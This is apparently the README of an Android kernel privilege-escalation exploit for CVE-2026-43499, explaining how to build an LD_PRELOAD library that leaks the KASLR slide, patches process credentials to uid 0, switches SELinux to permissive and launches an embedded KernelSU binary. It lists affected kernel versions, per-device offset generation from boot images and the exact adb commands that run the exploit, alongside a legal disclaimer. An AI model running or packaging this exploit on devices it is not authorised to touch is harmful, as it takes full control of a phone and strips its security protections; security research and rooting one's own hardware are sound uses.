# CVE-2026-43499-root-KernelSU

基于内核漏洞CVE-2026-43499的本地提权适配，集成嵌入式 KernelSU 。编译生成`preload.so`；触发成功后会以 `late-load` 模式(越狱模式)启动 KernelSU。支持(xbl_config.img / vendor_boot.img) + boot.img 生成target.h

Local privilege escalation adaptation based on a kernel vulnerability, integrating embedded KernelSU.
Compiles and generates `preload.so`; upon successful exploitation, KernelSU will be started in `late-load` mode (jailbreak mode).
Supports generating `target.h` from `(xbl_config.img / vendor_boot.img) + boot.img`. or other way

参考的项目：

- [Linuxoid-cn/CVE-2026-43499-Poc-Analysis](https://github.com/Linuxoid-cn/CVE-2026-43499-Poc-Analysis/)
- [x-spy/CVE-2026-43499-popsicle](https://github.com/x-spy/CVE-2026-43499-popsicle)
- [Colorful-glassblock/duchamp-root](https://github.com/Colorful-glassblock/duchamp-root)

>[!IMPORTANT]
>The unauthorized exploitation of vulnerabilities to damage, compromise, or gain access to computer systems is prohibited by law. This project is provided strictly for research, educational, and learning purposes, and may only be used in systems and environments for which prior authorization has been granted. Any use of this project is undertaken at the user's own risk. The authors and contributors assume no liability for any misuse of this project or for any damages, losses, or legal consequences resulting from its use.
>
>免责声明:未经授权利用漏洞对计算机系统实施破坏、入侵或未授权访问的行为均可能违反相关法律法规。本项目仅限于在已获得合法授权的系统和环境中用于安全研究、学习及测试目的。任何因使用、滥用或修改本项目而导致的直接或间接损失、法律责任及其他后果，均由使用者自行承担，项目作者及贡献者不承担任何责任。

## 影响范围

**当您的内核版本为 {Linux Kernel} 时，处在本次漏洞的影响范围**

- Linux Kernel < commit **3bfdc63936dd4773109b7b8c280c0f3b5ae7d349**

- **2.6.39** <=  {Linux Kernel} < **6.1.175**
- **6.2** <=  {Linux Kernel} < **6.6.140**
- **6.7** <=  {Linux Kernel} < **6.12.86**
- **6.13** <=  {Linux Kernel} < **6.18.27**
- **6.19** <=  {Linux Kernel} < **7.0.4**


## 当前状态

| Target | 状态 |
| --- | --- |
| `rodin`（默认） | 已验证 |
| 其他 `src/targets/*` | 参考 |

## 目录结构

```text
.
├── Makefile
├── build/
│   └── embed/
│       └── ksud                 # 被嵌入 preload.so 的 KernelSU userspace binary
├── tools/
│   ├── generate_target.py       # 本仓库统一 target.h 生成入口
│   └── vendor/                  # 从父目录同步的原始生成辅助脚本
└── src/
    ├── main.c                   # exploit 主流程
    ├── preload.c                # LD_PRELOAD constructor + ksud 写出/启动
    ├── root.c                   # cred/seccomp/SELinux/root patch
    ├── slide.c                  # pselect KASLR slide leak
    ├── fops.c                   # pselect/FOPS route
    ├── pipe.c                   # pipe-buffer phys R/W primitive
    ├── ksud_blob.S              # .incbin build/embed/ksud
    ├── kernelsnitch/            # KernelSnitch helpers
    └── targets/
        ├── rodin/
        ├── beryl/
        └── ...
```

## 构建


### 依赖

- Linux host
- Android NDK
  - 默认路径：`~/android-ndk-r29`
  - 或设置：`ANDROID_NDK_HOME` / `ANDROID_NDK_ROOT` / `NDK_ROOT`
- `make`
- `git`

### 构建

```bash
make PROJECT=<target> -j$(nproc)
```

输出：

```text
build/<target>/bin/preload.so
```

### 查看可用 target

```bash
make list-projects
```

## 生成 target.h

本仓库已经内置统一 target 生成脚本：

```text
tools/generate_target.py
tools/vendor/generate_target.py
tools/vendor/generate_target_2.py
tools/vendor/detect_offset.py
```

`tools/generate_target.py` 是入口脚本。它参考并封装了父目录所有 target 生成流程，最后输出适配本仓库源码的完整 `src/targets/<project>/target.h`。

脚本不会强制校验 IKCONFIG 中的 `CONFIG_DEBUG_INFO_BTF=y`。如果结构字段偏移或 percpu `entry_task` 布局无法验证，会打印警告并继续生成。

如果镜像里完全没有可用 BTF，例如出现：

```text
有效 vmlinux BTF 候选不唯一: []
```

生成器会进入 **无 BTF fallback**：

- 继续从当前 `boot.img` 的 kallsyms 恢复函数/全局对象符号偏移；
- 无法从 BTF 恢复的结构字段/layout 宏会继承模板 target，默认模板为 `rodin`；
- 生成的 header 顶部会写入 warning，标明 `without BTF` 和使用的模板；
- 这种 header 保证尽量可编译，但运行可靠性需要实机验证。

可指定 fallback 模板：

```bash
tools/generate_target.py --project <project> --boot boot.img --profile profile.json --template-target rodin
# 或
TARGET_TEMPLATE=rodin tools/generate_target.py --project <project> --boot boot.img --profile profile.json
```

#### 1.使用 boot.img + profile JSON 生成

```bash
make generate-target PROJECT=<project> BOOT=/path/to/boot.img PROFILE=/path/to/profile.json
```

默认写入：

```text
src/targets/<project>/target.h
```

也可以直接调用脚本：

```bash
tools/generate_target.py --project <project> --boot /path/to/boot.img --profile /path/to/profile.json
```

`profile.json` 需要包含物理地址信息，例如：

```json
{
  "p0_phys_offset": "0x40000000",
  "p0_kernel_phys_load": "0x40000000"
}
```

#### 2.从已 root 的 ADB 设备检测 profile

只生成 profile：

```bash
make detect-profile PROFILE_OUT=profile.json
```

检测 profile 并立即生成 target：

```bash
tools/generate_target.py --project <project> --boot /path/to/boot.img \
  --detect-adb-and-generate --profile-out profile.json
```

#### 3.(xbl_config.img / vendor_boot.img) + boot.img 生成

脚本同时暴露父目录生成器支持的其他入口：

```bash
tools/generate_target.py --project <project> --boot boot.img --xbl-config xbl_config.img

tools/generate_target.py --project <project> --boot boot.img --mtk-vendor-boot vendor_boot.img

tools/generate_target.py --project <project> --boot boot.img --mtk-partitions /path/to/partitions
```

##### 示例

```bash
make generate-target PROJECT=rodin BOOT=../rodin/boot_a PROFILE=../profile.json
make generate-target PROJECT=beryl BOOT=../beryl/boot.img PROFILE=../profile.json
```

成功输出形态：

```text
生成成功: .../src/targets/<project>/target.h
kernel SHA-256: <sha256>
target macros: 168
```

`rodin` 会默认保留实机验证过的：

```c
#define MM_STRUCT_SZ 0x500
```

如需覆盖：

```bash
tools/generate_target.py --project rodin --boot boot.img --profile profile.json --mm-struct-sz 0x...
```

## 添加新 target

推荐从匹配的 boot image 和 profile 生成：

```bash
make generate-target PROJECT=<project> BOOT=/path/to/boot.img PROFILE=/path/to/profile.json
make PROJECT=<project> -j$(nproc)
```

一个完整 target header 会包含：

- direct map / physical profile 常量
- KASLR slide object 偏移
- task / cred / SELinux 偏移
- pipe / fops / configfs 偏移
- pselect layout 值，例如 `PSELECT_WAITER_WORD_SHIFT`
- `MM_STRUCT_SZ` 与 KernelSnitch 调参值

## 运行

当前源码已写入默认值，正常运行只需要设置 `LD_PRELOAD`，并执行任意程序(建议 `toybox id`)。

```bash
adb push build/rodin/bin/preload.so /data/local/tmp/preload.so
adb shell 'chmod 755 /data/local/tmp/preload.so'
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/toybox id'
```

## 默认运行参数

当前默认配置如下：

| 设置 | 默认值 | 说明 |
| --- | --- | --- |
| `KSUD_LATE_LOAD` | `1` | 执行 `ksud late-load` |
| `KSUD_ALLOW_SHELL` | `1` | 传入 `--allow-shell` |
| `KSUD_PACKAGE` | `me.weishu.kernelsu` | 传给 ksud 的管理器包名(貌似不起效) |
| `KSUD_DST` | `/data/local/tmp/ksud` | 内置 ksud 写出路径 |
| `KSUD_SKIP_WRITE` | `0` | 默认写出内置 ksud |
| `KSUD_DEFER_TO_PARENT` | `1` | 从已 patch 的父/当前进程路径启动 ksud |
| `ROOT_PATCH_SELF` | `1` | patch 当前进程为 uid 0 |
| `DISABLE_SELINUX` | `1` | root patch 时将 SELinux enforcing 写为 permissive |
| `ROOT_EXIT_SLEEP` | unset / `0` | 返回前不额外 sleep |

默认实际执行的 ksud 命令行为：

```bash
/data/local/tmp/ksud late-load --allow-shell --package-name me.weishu.kernelsu
```

这些环境变量仍然可以在运行时覆盖，例如：

```bash
adb shell 'KSUD_PACKAGE=com.example.manager LD_PRELOAD=/data/local/tmp/preload.so /system/bin/toybox id'
```

复用已经写出的 `ksud`：

```bash
adb shell 'KSUD_SKIP_WRITE=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/toybox id'
```

## 清理

```bash
make clean
```

`make clean` 会保留 `build/embed/ksud`，因为 `src/ksud_blob.S` 通过下面的方式嵌入它：

```asm
.incbin "build/embed/ksud"
```

如果手动清理导致 `build/embed/ksud` 丢失，可以恢复：

```bash
git checkout -- build/embed/ksud
```

## 常见问题

### `.incbin "build/embed/ksud"` not found

恢复内置 payload 后重新构建：

```bash
git checkout -- build/embed/ksud
make PROJECT=rodin -j$(nproc)
```

### FOPS route 返回 `success=0`

`rodin` 期望使用 legacy/simple pselect layout：

```text
pselect fdset simple layout shift=0
pselect returned attempt=1 ret=9 ... success=1
```

如果设备状态被失败尝试污染，直接重启后再试：

```bash
adb reboot
```

### `F_SETPIPE_SZ` 返回 `EPERM`

通常是失败/残留尝试导致的状态问题，重启是最快清理方式：

```bash
adb reboot
```

### `ksud` 启动但 `/proc/modules` 没有 KernelSU

查看日志：

```bash
adb shell 'cat /data/local/tmp/ksud.log /data/local/tmp/ksud.preload.log 2>/dev/null || true'
```

必要时在 root shell 中手动运行：

```bash
/data/local/tmp/ksud late-load --allow-shell --package-name me.weishu.kernelsu
```

## License

GPL-3.0. See [`LICENSE`](LICENSE).
